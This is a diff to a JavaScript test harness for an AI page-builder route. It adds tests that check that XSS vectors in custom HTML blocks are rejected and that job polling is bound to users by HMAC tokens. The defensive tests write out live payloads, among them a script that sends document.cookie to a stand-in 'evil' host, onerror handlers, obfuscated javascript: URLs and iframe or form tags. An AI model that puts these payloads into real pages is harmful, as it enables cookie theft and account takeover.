@@ -142,7 +142,7 @@ const { default: postgres } = await import('postgres');
 const { default: express } = await import('express');
 const { default: jwt } = await import('jsonwebtoken');
 const { ensureTables } = await import('../server/src/routes/funnels.js');
-const { default: aiRouter, applyOps } = await import('../server/src/routes/aiDeveloper.js');
+const { default: aiRouter, applyOps, scanHtmlString, jobToken } = await import('../server/src/routes/aiDeveloper.js');
 const { isAllowedAssetUrl } = await import('../server/src/services/higgsfield.js');
 
 const sql = postgres(process.env.DATABASE_URL, { max: 5, idle_timeout: 5 });
@@ -155,20 +155,22 @@ await ensureTables();
 // The embedded harness DB already carries the platform's users/roles schema
 // (uuid ids) — reuse it with throwaway uuid fixtures.
 const USER_ID = crypto.randomUUID();
+const USER2_ID = crypto.randomUUID(); // second funnels user — for job-token binding
 const ROLE_ID = crypto.randomUUID();
 const FUNNEL_ID = 'fnl_aidev_test';
 const PAGE_ID = 'fpg_aidev_test';
 
-await q(`DELETE FROM user_roles WHERE user_id IN (SELECT id FROM users WHERE email = 'aidev@test.local')`);
-await q(`DELETE FROM users WHERE email = 'aidev@test.local'`);
+await q(`DELETE FROM user_roles WHERE user_id IN (SELECT id FROM users WHERE email IN ('aidev@test.local', 'aidev2@test.local'))`);
+await q(`DELETE FROM users WHERE email IN ('aidev@test.local', 'aidev2@test.local')`);
 await q(`DELETE FROM roles WHERE name = 'aidev-tester'`);
 await q(
   `INSERT INTO users (id, email, password_hash, first_name, last_name, is_active, must_change_password, email_verified)
-   VALUES ($1, 'aidev@test.local', 'not-a-real-hash', 'AI', 'Dev', TRUE, FALSE, TRUE)`,
-  [USER_ID]
+   VALUES ($1, 'aidev@test.local', 'not-a-real-hash', 'AI', 'Dev', TRUE, FALSE, TRUE),
+          ($2, 'aidev2@test.local', 'not-a-real-hash', 'Other', 'Dev', TRUE, FALSE, TRUE)`,
+  [USER_ID, USER2_ID]
 );
 await q(`INSERT INTO roles (id, name, permissions) VALUES ($1, 'aidev-tester', '{"funnels": ["access"]}'::jsonb)`, [ROLE_ID]);
-await q(`INSERT INTO user_roles (user_id, role_id) VALUES ($1, $2)`, [USER_ID, ROLE_ID]);
+await q(`INSERT INTO user_roles (user_id, role_id) VALUES ($1, $2), ($3, $2)`, [USER_ID, ROLE_ID, USER2_ID]);
 
 await q(`DELETE FROM funnel_pages WHERE funnel_id = $1`, [FUNNEL_ID]);
 await q(`DELETE FROM funnels WHERE id = $1`, [FUNNEL_ID]);
@@ -204,6 +206,12 @@ const BASE = `http://127.0.0.1:${appServer.address().port}`;
 
 const token = jwt.sign({ userId: USER_ID }, 'dev-access-secret-change-me', { expiresIn: '15m' });
 const authHeaders = { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' };
+// A second authenticated funnels user (for the job→user binding test).
+const token2 = jwt.sign({ userId: USER2_ID }, 'dev-access-secret-change-me', { expiresIn: '15m' });
+const authHeaders2 = { Authorization: `Bearer ${token2}`, 'Content-Type': 'application/json' };
+// jobToken() is HMAC'd with env.JWT_ACCESS_SECRET; the harness runs under the
+// same default dev secret the auth middleware verifies with.
+const jobTok = (id, uid) => jobToken(id, uid);
 
 // SSE reader: returns {status, events:[{event,data}], json} for a fetch.
 async function postChat(body, headers = authHeaders) {
@@ -301,6 +309,54 @@ console.log('\n== (b) applyOps unit: invalid ops are REJECTED ==');
   assert(cur[0].props.headline === 'Old headline', 'applyOps never mutates its input');
 }
 
+console.log('\n== (MAJOR #1) executable-HTML vectors rejected ==');
+{
+  const cur = [
+    { id: 'b1', type: 'hero', props: { headline: 'H' } },
+    { id: 'ch', type: 'custom_html', props: { html: '<div>ok</div>', css: '' } },
+    { id: 'rw', type: 'row', props: { columns: [{ html: 'a' }, { html: 'b' }] } },
+  ];
+  const insHtml = (html) => applyOps(cur, [{ op: 'insert_block', block: { type: 'custom_html', props: { html } } }]);
+  const rejected = (r, label) => assert(r.error && /not allowed/.test(r.error), `${label} rejected (${(r.error || 'NO ERROR').slice(0, 60)})`);
+
+  // one assertion per vector, both via insert_block and replace_props
+  rejected(insHtml('<script>fetch("//evil/"+document.cookie)</script>'), '<script> tag');
+  rejected(insHtml('<SCRIPT >alert(1)</SCRIPT>'), 'uppercase/space <script>');
+  rejected(insHtml('<  script>x</script>'), 'whitespace-after-< <script>');
+  rejected(insHtml('<img src=x onerror=alert(1)>'), 'onerror= (unquoted)');
+  rejected(insHtml('<img src="x" onerror = "steal()">'), 'onerror spaced =');
+  rejected(insHtml('<a href="javascript:alert(1)">x</a>'), 'javascript: href');
+  rejected(insHtml('<a href="jav\tascript:alert(1)">x</a>'), 'obfuscated javascript: href');
+  rejected(insHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'), 'data:text/html URL');
+  rejected(insHtml('<iframe src="//evil"></iframe>'), '<iframe> tag');
+  rejected(insHtml('<object data="//evil"></object>'), '<object> tag');
+  rejected(insHtml('<embed src="//evil">'), '<embed> tag');
+  rejected(insHtml('<base href="//evil/">'), '<base> tag');
+  rejected(insHtml('<form action="//evil"></form>'), '<form> tag');
+  rejected(applyOps(cur, [{ op: 'insert_block', block: { type: 'section', props: { html: '<div style="background:url(javascript:alert(1))">x</div>' } } }]), 'url(javascript:) in style');
+  // existing html-bearing block, via replace_props
+  rejected(applyOps(cur, [{ op: 'replace_props', block_id: 'ch', props: { html: '<script>1</script>', css: '' } }]), 'replace_props onto custom_html');
+  rejected(applyOps(cur, [{ op: 'replace_props', block_id: 'ch', props: { html: 'ok', css: 'a{background:url(javascript:1)}' } }]), 'malicious css prop');
+  // row column vector
+  rejected(applyOps(cur, [{ op: 'replace_props', block_id: 'rw', props: { columns: [{ html: 'ok' }, { html: '<script>evil()</script>' }] } }]), 'row column html');
+
+  // BENIGN custom_html must still pass — no over-blocking
+  const benign = insHtml('<div class="promo" style="padding:24px;color:#16a34a"><img src="https://cdn.example.com/a.png" alt="x"><p>Buy now for $49</p></div>');
+  assert(!benign.error, `benign custom_html passes (${benign.error || 'no error'})`);
+  eq(benign?.ops?.length, 1, 'benign op normalized');
+  const benignRow = applyOps(cur, [{ op: 'replace_props', block_id: 'rw', props: { columns: [{ html: '<p>Left <b>bold</b></p>' }, { html: '<ul><li>a</li></ul>' }] } }]);
+  assert(!benignRow.error, `benign row columns pass (${benignRow.error || 'no error'})`);
+  // false-positive guard: "on"-prefixed words and the word javascript in prose
+  const prose = insHtml('<p>Our salon is only online. Learn JavaScript basics on Monday.</p>');
+  assert(!prose.error, `prose with 'on'-words and the word JavaScript passes (${prose.error || 'no error'})`);
+
+  // scanHtmlString unit spot-checks
+  eq(scanHtmlString('<div>hi</div>'), null, 'clean div → null');
+  assert(scanHtmlString('<ScRiPt>') !== null, 'mixed-case script flagged');
+  assert(scanHtmlString('onclick=1') !== null, 'bare onclick= flagged');
+  eq(scanHtmlString('button onboarding season'), null, 'on-words not flagged');
+}
+
 console.log('\n== (a) tool loop round-trip ==');
 {
   anthropicScript = [
@@ -390,29 +446,52 @@ console.log('\n== (c) generate_image → async job → host-validated status =='
   eq(done?.jobs?.[0]?.id, 'req_good_1', 'job id comes from Higgsfield');
   eq(done?.jobs?.[0]?.kind, 'image', 'job kind is image');
   assert(r.events.some((e) => e.event === 'job' && e.data.id === 'req_good_1'), 'job SSE event emitted');
+  const jobEvt = r.events.find((e) => e.event === 'job' && e.data.id === 'req_good_1')?.data;
+  assert(typeof jobEvt?.token === 'string' && jobEvt.token.length === 64, 'job SSE event carries a 64-hex HMAC token');
+  eq(jobEvt.token, jobTok('req_good_1', USER_ID), 'token is HMAC(jobId,userId) under the JWT secret');
   const submit = higgsfieldRequests.find((h) => h.url === '/higgsfield-ai/soul/standard');
   assert(!!submit, 'Higgsfield submit endpoint was called');
   eq(submit?.auth, 'Key hf-test-key:hf-test-secret', 'credentials sent in the Authorization header (never in the URL)');
   assert(JSON.parse(submit.body).aspect_ratio === '16:9', 'aspect_ratio forwarded');
 
-  // Poll flow: queued → completed with allowed host
-  const p1 = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: authHeaders })).json();
-  eq(p1.data.status, 'queued', 'first poll: queued');
-  const p2 = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: authHeaders })).json();
-  eq(p2.data.status, 'completed', 'second poll: completed');
+  // Owner polls WITH the issued token → queued then completed with allowed host
+  const good = jobTok('req_good_1', USER_ID);
+  const pollGood = (t = good) => fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: { ...authHeaders, 'X-Job-Token': t } });
+  const p1 = await (await pollGood()).json();
+  eq(p1.data.status, 'queued', 'owner first poll: queued');
+  const p2 = await (await pollGood()).json();
+  eq(p2.data.status, 'completed', 'owner second poll: completed');
   eq(p2.data.url, 'https://assets.higgsfield.ai/gen/img-1.png', 'allowed https higgsfield URL returned');
 
-  const evil = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_evil_1`, { headers: authHeaders })).json();
+  const good2 = jobTok('req_evil_1', USER_ID);
+  const evil = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_evil_1`, { headers: { ...authHeaders, 'X-Job-Token': good2 } })).json();
   eq(evil.data.status, 'failed', 'non-higgsfield host → failed');
   eq(evil.data.url, null, 'non-higgsfield URL never returned');
   assert(/rejected/.test(evil.data.error || ''), 'rejection reason present');
 
-  const httpUrl = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_http_1`, { headers: authHeaders })).json();
+  const httpTok = jobTok('req_http_1', USER_ID);
+  const httpUrl = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_http_1`, { headers: { ...authHeaders, 'X-Job-Token': httpTok } })).json();
   eq(httpUrl.data.status, 'failed', 'plain-http higgsfield URL → failed');
   eq(httpUrl.data.url, null, 'http URL never returned');
 
-  const nsfw = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_nsfw_1`, { headers: authHeaders })).json();
+  const nsfwTok = jobTok('req_nsfw_1', USER_ID);
+  const nsfw = await (await fetch(`${BASE}/api/v1/ai-developer/jobs/req_nsfw_1`, { headers: { ...authHeaders, 'X-Job-Token': nsfwTok } })).json();
   eq(nsfw.data.status, 'failed', 'nsfw status normalizes to failed');
+
+  // --- MINOR #2: job → user binding ---------------------------------------
+  const otherToken = jobTok('req_good_1', USER2_ID); // valid HMAC, wrong user
+  const jobsAuthedNoTok = await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: authHeaders });
+  eq(jobsAuthedNoTok.status, 404, 'authed but NO X-Job-Token → 404');
+  const jobsGarbage = await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: { ...authHeaders, 'X-Job-Token': 'garbage' } });
+  eq(jobsGarbage.status, 404, 'garbage token → 404');
+  const jobsOtherUsersTok = await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: { ...authHeaders, 'X-Job-Token': otherToken } });
+  eq(jobsOtherUsersTok.status, 404, "another user's token (wrong userId) → 404");
+  // user2 presenting user1's token also fails (binding is per-user, verified against req.user)
+  const user2WithOwnersTok = await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: { ...authHeaders2, 'X-Job-Token': good } });
+  eq(user2WithOwnersTok.status, 404, "other user presenting owner's token → 404");
+  // user2 with THEIR OWN correctly-derived token succeeds (Higgsfield 404 → 502, not a binding 404)
+  const user2Own = await fetch(`${BASE}/api/v1/ai-developer/jobs/req_good_1`, { headers: { ...authHeaders2, 'X-Job-Token': otherToken } });
+  assert(user2Own.status !== 404, `owner-bound token passes the binding gate (status ${user2Own.status})`);
 
   // isAllowedAssetUrl unit edges
   eq(isAllowedAssetUrl('https://higgsfield.ai/x.png'), true, 'apex higgsfield.ai allowed');
@@ -447,8 +526,8 @@ console.log('\n== (d) route NEVER writes funnel_pages ==');
 // ---------------------------------------------------------------------------
 await q(`DELETE FROM funnel_pages WHERE funnel_id = $1`, [FUNNEL_ID]);
 await q(`DELETE FROM funnels WHERE id = $1`, [FUNNEL_ID]);
-await q(`DELETE FROM user_roles WHERE user_id = $1`, [USER_ID]);
-await q(`DELETE FROM users WHERE id = $1`, [USER_ID]);
+await q(`DELETE FROM user_roles WHERE user_id IN ($1, $2)`, [USER_ID, USER2_ID]);
+await q(`DELETE FROM users WHERE id IN ($1, $2)`, [USER_ID, USER2_ID]);
 await q(`DELETE FROM roles WHERE id = $1`, [ROLE_ID]);
 await sql.end();
 anthropicServer.close();
